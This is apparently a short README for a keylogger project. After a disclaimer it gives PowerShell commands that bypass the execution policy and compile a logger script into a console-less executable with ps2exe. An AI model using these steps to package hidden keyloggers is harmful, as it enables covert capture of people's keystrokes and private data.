
!!!!!###THIS IS STRICTLY FOR EDUCATIONAL PURPOSE AND PROJECT DEV THE DEVS OF THIS PROJECT DO NOT CONDONE ANY SORT OF UNETHICAL HACKING NOR EXPLOITION OF PEOPLE PRIVACY###!!!!!!!
!!!!! MAIN.CPP IS NOT COMPLETED DUE TO THE NOTION OF AVOIDING ANY OUTSIDE USE THAT CAN BE USED FOR HARM !!!!!!!!!!!!!!!!!

install the compile module
Install-Module -Name ps2exe -Scope CurrentUser

Key parts for compilations for execution .exe:
   1. set a bypass command so powershell system block isnt raised: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
    2. Import-Module ps2exe : ps2exe -inputFile "PATH\TO\LOGGER.PS1" -outputFile "PATH\TO\LOGGER.EXE" -noConsole
